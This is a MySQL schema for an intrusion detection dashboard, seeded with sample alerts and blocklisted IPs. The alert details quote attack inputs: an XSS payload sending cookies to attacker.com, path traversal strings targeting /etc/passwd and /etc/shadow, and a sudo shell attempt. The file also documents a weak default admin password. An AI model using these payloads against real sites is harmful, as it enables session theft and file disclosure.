-- ============================================================
--  CyberWatch IDS — MySQL Database Schema
--  Run: mysql -u root -p < schema.sql
-- ============================================================

CREATE DATABASE IF NOT EXISTS cyberwatch CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE cyberwatch;

-- ── USERS ────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS users (
  id            INT AUTO_INCREMENT PRIMARY KEY,
  username      VARCHAR(80)  NOT NULL UNIQUE,
  password_hash VARCHAR(255) NOT NULL,
  role          ENUM('admin','analyst','viewer') DEFAULT 'analyst',
  created_at    DATETIME DEFAULT CURRENT_TIMESTAMP,
  last_login    DATETIME,
  is_active     BOOLEAN DEFAULT TRUE
);

-- Default admin user  (password: cyber123  — change immediately in production!)
-- Generated with:  from werkzeug.security import generate_password_hash; generate_password_hash('cyber123')
INSERT INTO users (username, password_hash, role) VALUES
('admin', 'pbkdf2:sha256:600000$placeholder$changeme', 'admin');

-- ── REPORTS ──────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS reports (
  id              INT AUTO_INCREMENT PRIMARY KEY,
  report_id       VARCHAR(40)  NOT NULL UNIQUE,   -- e.g. RPT-ABC123
  file_name       VARCHAR(255) NOT NULL,
  uploaded_by     INT          NOT NULL REFERENCES users(id),
  total_lines     INT          DEFAULT 0,
  total_parsed    INT          DEFAULT 0,
  critical_count  INT          DEFAULT 0,
  suspicious_count INT         DEFAULT 0,
  clean_count     INT          DEFAULT 0,
  unique_ips      INT          DEFAULT 0,
  risk_score      INT          DEFAULT 0,
  risk_label      ENUM('LOW','MEDIUM','HIGH','CRITICAL') DEFAULT 'LOW',
  findings_json   JSON,
  status_codes_json JSON,
  created_at      DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- ── ALERTS ───────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS alerts (
  id          INT AUTO_INCREMENT PRIMARY KEY,
  alert_id    VARCHAR(10)  NOT NULL UNIQUE,          -- e.g. A001
  type        ENUM('critical','warning','info') NOT NULL,
  category    VARCHAR(30)  NOT NULL,
  title       VARCHAR(255) NOT NULL,
  source_ip   VARCHAR(45),
  detail      TEXT,
  alert_time  VARCHAR(10),
  module      VARCHAR(60),
  log_file    VARCHAR(80),
  rule_id     VARCHAR(20),
  attempts    INT DEFAULT 0,
  port        INT DEFAULT 0,
  status      ENUM('active','blocked','watchlist','mitigated','flagged','resolved') DEFAULT 'active',
  created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at  DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  resolved_by INT REFERENCES users(id),
  resolved_at DATETIME
);

-- ── UPLOADED LOG FILES ────────────────────────────────────────
CREATE TABLE IF NOT EXISTS log_files (
  id            INT AUTO_INCREMENT PRIMARY KEY,
  file_name     VARCHAR(255) NOT NULL,
  file_size     BIGINT DEFAULT 0,
  file_path     VARCHAR(500),        -- server-side path where raw file is stored
  uploaded_by   INT REFERENCES users(id),
  total_lines   INT DEFAULT 0,
  threat_count  INT DEFAULT 0,
  report_id     INT REFERENCES reports(id),
  uploaded_at   DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- ── LOG ENTRIES (parsed from uploads) ────────────────────────
CREATE TABLE IF NOT EXISTS log_entries (
  id            INT AUTO_INCREMENT PRIMARY KEY,
  log_file_id   INT REFERENCES log_files(id) ON DELETE CASCADE,
  entry_ts      DATETIME,
  ip_address    VARCHAR(45),
  method        VARCHAR(10),
  path          VARCHAR(1000),
  status_code   SMALLINT,
  flag          ENUM('CLEAN','SUSPICIOUS','CRITICAL') DEFAULT 'CLEAN',
  raw_line      TEXT,
  created_at    DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- ── IP BLOCKLIST ──────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS ip_blocklist (
  id            INT AUTO_INCREMENT PRIMARY KEY,
  ip_address    VARCHAR(45) NOT NULL UNIQUE,
  country       VARCHAR(60),
  threat_level  INT DEFAULT 0,           -- 0-100
  attempts      INT DEFAULT 0,
  status        ENUM('BLOCKED','WATCHLIST','ALLOWED') DEFAULT 'BLOCKED',
  reason        TEXT,
  added_by      INT REFERENCES users(id),
  added_at      DATETIME DEFAULT CURRENT_TIMESTAMP,
  updated_at    DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  notes         TEXT
);

-- Seed some IP data
INSERT INTO ip_blocklist (ip_address, country, threat_level, attempts, status, reason) VALUES
('192.168.1.47',  'Local Network',    95, 843,  'BLOCKED',    'SSH Brute Force — 843 attempts in 60s'),
('203.0.113.42',  'Unknown',          82, 340,  'BLOCKED',    'SQLMap scanner detected'),
('198.51.100.7',  'Germany',          71, 127,  'BLOCKED',    'Path traversal + directory scan'),
('172.16.0.9',    'Local Network',    65, 1024, 'WATCHLIST',  'Port scan — 1024 ports in 5s'),
('45.33.32.156',  'United States',    50, 55,   'WATCHLIST',  'Repeated 401 auth failures'),
('185.220.101.1', 'Netherlands',      88, 210,  'BLOCKED',    'Known Tor exit node'),
('10.0.1.44',     'Local Network',    77, 8,    'BLOCKED',    'SSRF cloud metadata attempt'),
('203.0.113.99',  'Unknown',          60, 340,  'BLOCKED',    'Automated SQLMap scanner'),
('91.108.4.0',    'Russia',           45, 18,   'WATCHLIST',  'Suspicious outbound traffic'),
('104.21.0.1',    'United States',    20, 4,    'ALLOWED',    'Cloudflare CDN — whitelisted');

-- ── LIVE LOG STREAM (dashboard feed) ─────────────────────────
CREATE TABLE IF NOT EXISTS live_logs (
  id      INT AUTO_INCREMENT PRIMARY KEY,
  level   ENUM('CRIT','WARN','INFO','OK') NOT NULL,
  source  VARCHAR(50),
  message TEXT,
  host_ip VARCHAR(45),
  ts      DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- ── INDEXES ───────────────────────────────────────────────────
CREATE INDEX idx_alerts_type      ON alerts(type);
CREATE INDEX idx_alerts_category  ON alerts(category);
CREATE INDEX idx_alerts_status    ON alerts(status);
CREATE INDEX idx_alerts_source    ON alerts(source_ip);
CREATE INDEX idx_log_entries_flag ON log_entries(flag);
CREATE INDEX idx_log_entries_file ON log_entries(log_file_id);
CREATE INDEX idx_ip_status        ON ip_blocklist(status);
CREATE INDEX idx_reports_user     ON reports(uploaded_by);
CREATE INDEX idx_live_logs_ts     ON live_logs(ts);

-- ── SEED ALERTS ───────────────────────────────────────────────
INSERT INTO alerts (alert_id,type,category,title,source_ip,detail,alert_time,module,log_file,rule_id,attempts,port,status) VALUES
('A001','critical','brute-force','SSH Brute Force — Root Account','192.168.1.47','843 failed SSH attempts for root in 60s. Credential stuffing tool detected (Hydra user-agent).','09:14','Anomaly Detection','auth.log','RULE-BF-001',843,22,'active'),
('A002','critical','injection','SQL Injection — Users Endpoint','203.0.113.42','UNION SELECT payload in /api/users?id=. Attacker extracted DB schema. WAF blocked 47 follow-up probes.','08:33','Pattern Matching','nginx.log','RULE-SQLI-001',47,443,'blocked'),
('A003','warning','recon','Nmap Full Port Scan','172.16.0.9','SYN scan across all 65535 ports in 8 seconds. OS fingerprinting also attempted.','10:02','Anomaly Detection','firewall.log','RULE-SCAN-001',1,0,'watchlist'),
('A004','critical','privilege','Sudo Escalation — Guest User','10.0.0.23','guest attempted: sudo /bin/bash. PAM blocked. 3 more attempts in 90s.','11:45','Anomaly Detection','auth.log','RULE-PRIV-001',4,0,'blocked'),
('A005','warning','web','XSS in Search Parameter','198.51.100.15','<script>document.location=attacker.com?c=document.cookie</script> in ?q=. Reflected XSS blocked by WAF.','07:22','Pattern Matching','nginx.log','RULE-XSS-001',3,80,'mitigated'),
('A006','critical','dos','SYN Flood Attack','45.33.32.156','18,000 SYN packets/second targeting port 443. Null-routed at edge after 12s.','13:07','Anomaly Detection','firewall.log','RULE-DOS-001',18000,443,'blocked'),
('A007','critical','malware','C2 Beacon — Cobalt Strike','10.0.0.88','Periodic beaconing to 185.220.101.34:4444 every 60s. Payload matches Cobalt Strike profile.','06:15','DNS Monitor','syslog','RULE-MAL-001',47,4444,'flagged'),
('A008','warning','web','Path Traversal Attack','198.51.100.7','../../../etc/passwd and ..%2F..%2Fetc%2Fshadow in URL params. 9 variants all blocked by WAF.','07:48','Pattern Matching','nginx.log','RULE-DIR-001',9,80,'blocked'),
('A009','critical','exfiltration','Large Outbound Transfer','203.0.113.42','2.8 GB uploaded to 203.0.113.42 in 4 minutes. DLP policy triggered and connection terminated.','14:30','Anomaly Detection','firewall.log','RULE-DATA-001',1,0,'flagged'),
('A010','info','system','C2 Domain DNS Blocked','10.0.0.14','DNS query to malware-c2-server.ru blocked by DNS sinkhole.','08:50','DNS Monitor','syslog','RULE-DNS-002',1,53,'blocked'),
('A011','info','system','Log Rotation Completed','System','Auto log rotation at 05:00. 48 MB archived.','05:00','System','syslog','SYSTEM',0,0,'resolved'),
('A012','info','system','IDS Signature Update','System','12 new attack signatures loaded from threat feed.','05:30','System','syslog','SYSTEM',0,0,'resolved');
